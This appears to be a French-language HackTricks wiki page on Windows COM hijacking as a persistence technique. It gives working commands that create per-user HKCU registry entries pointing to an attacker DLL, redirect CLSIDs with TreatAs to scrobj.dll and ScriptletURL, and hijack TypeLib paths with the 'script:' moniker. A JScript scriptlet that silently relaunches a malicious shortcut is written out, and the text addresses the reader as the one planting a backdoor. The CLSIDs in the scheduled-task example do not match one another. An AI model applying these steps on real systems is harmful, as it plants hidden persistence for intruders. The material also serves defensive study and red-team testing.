# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Recherche de composants COM inexistants

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, **COM Hijacking** peut être utilisé comme mécanisme de **persistance**. Avec `procmon`, il est facile de trouver des entrées de registre COM recherchées qui n'existent pas encore et pourraient être créées par un attaquant. Filtres classiques :

- Opérations **RegOpenKey**.
- où le _Result_ est **NAME NOT FOUND**.
- et que le _Path_ se termine par **InprocServer32**.

Variations utiles lors de la recherche :

- Recherchez également les clés **`LocalServer32`** manquantes. Certaines classes COM sont des serveurs hors-processus et lanceront un EXE contrôlé par l'attaquant au lieu d'une DLL.
- Recherchez les opérations de registre **`TreatAs`** et **`ScriptletURL`** en plus de `InprocServer32`. Les contenus de détection récents et les analyses de malware mentionnent souvent ces clés car elles sont beaucoup plus rares que les enregistrements COM normaux et donc très indicatives.
- Copiez le **`ThreadingModel`** légitime depuis `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` lorsque vous clonez une inscription dans HKCU. Utiliser le mauvais modèle casse souvent l'activation et rend le hijack bruyant.
- Sur les systèmes 64-bit inspectez à la fois les vues 64-bit et 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` et `HKLM\Software\Classes\WOW6432Node`) car les applications 32-bit peuvent résoudre un enregistrement COM différent.

Une fois que vous avez décidé quel COM inexistant usurper, exécutez les commandes suivantes. _Faites attention si vous décidez d'usurper un COM chargé toutes les quelques secondes, car cela peut être excessif._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Les Windows Tasks utilisent des Custom Triggers pour appeler des COM objects et, comme elles sont exécutées via le Task Scheduler, il est plus facile de prédire quand elles seront déclenchées.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

En examinant la sortie, vous pouvez en sélectionner une qui sera exécutée, par exemple, **à chaque connexion d'un utilisateur**.

En recherchant maintenant le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\CLASSES\ROOT\CLSID** et dans HKLM et HKCU, vous constaterez généralement que la valeur n'existe pas dans HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ensuite, vous pouvez simplement créer l'entrée HKCU et, à chaque ouverture de session de l'utilisateur, votre backdoor sera déclenchée.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permet à un CLSID d'être émulé par un autre. D'un point de vue offensif, cela signifie que vous pouvez laisser le CLSID original intact, créer un second CLSID par utilisateur qui pointe vers `scrobj.dll`, puis rediriger l'objet COM réel vers le malveillant avec `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Ceci est utile lorsque :

- l'application cible instancie déjà un CLSID stable à l'ouverture de session ou au démarrage de l'application
- vous voulez une redirection uniquement via le registre au lieu de remplacer l'original `InprocServer32`
- vous voulez exécuter un scriptlet local ou distant `.sct` via la valeur `ScriptletURL`

Exemple de workflow (adapté du tradecraft public d'Atomic Red Team et de recherches antérieures sur l'abus du registre COM) :
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Remarques :

- `scrobj.dll` lit la valeur `ScriptletURL` et exécute le `.sct` référencé, vous pouvez donc garder le payload en tant que fichier local ou le récupérer à distance via HTTP/HTTPS.
- `TreatAs` est particulièrement utile quand l'enregistrement COM original est complet et stable dans HKLM, car vous n'avez besoin que d'une petite redirection par utilisateur au lieu de dupliquer toute l'arborescence.
- Pour valider sans attendre le déclencheur naturel, vous pouvez instancier manuellement le faux ProgID/CLSID avec `rundll32.exe -sta <ProgID-or-CLSID>` si la classe cible prend en charge l'activation STA.

## COM TypeLib Hijacking (script: moniker persistence)

Les Type Libraries (TypeLib) définissent des interfaces COM et sont chargées via `LoadTypeLib()`. Quand un serveur COM est instancié, l'OS peut aussi charger le TypeLib associé en consultant les clés de registre sous `HKCR\TypeLib\{LIBID}`. Si le chemin du TypeLib est remplacé par un **moniker**, par exemple `script:C:\...\evil.sct`, Windows exécutera le scriptlet lorsque le TypeLib sera résolu — ce qui donne une persistance discrète qui se déclenche quand des composants courants sont sollicités.

Cela a été observé contre le contrôle Microsoft Web Browser (souvent chargé par Internet Explorer, des applications embarquant WebBrowser, et même `explorer.exe`).

### Steps (PowerShell)

1) Identifier le TypeLib (LIBID) utilisé par un CLSID à haute fréquence. Exemple de CLSID souvent abusé par des chaînes de malware : `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Pointez le chemin TypeLib par utilisateur vers un scriptlet local en utilisant le moniker `script:` (aucun droit d'administrateur requis) :
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Déposez un JScript minimal `.sct` qui relance votre payload principal (p. ex. un `.lnk` utilisé par la chaîne initiale):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Déclenchement – ouvrir IE, lancer une application qui intègre le WebBrowser control, ou même une activité courante d'Explorer chargera le TypeLib et exécutera le scriptlet, réarmant votre chaîne à l'ouverture de session/redémarrage.

Nettoyage
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Remarques
- Vous pouvez appliquer la même logique à d'autres composants COM fréquemment utilisés ; résolvez toujours d'abord le véritable `LIBID` à partir de `HKCR\CLSID\{CLSID}\TypeLib`.
- Sur les systèmes 64-bit vous pouvez également renseigner la sous-clé `win64` pour les consommateurs 64-bit.

## Références

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
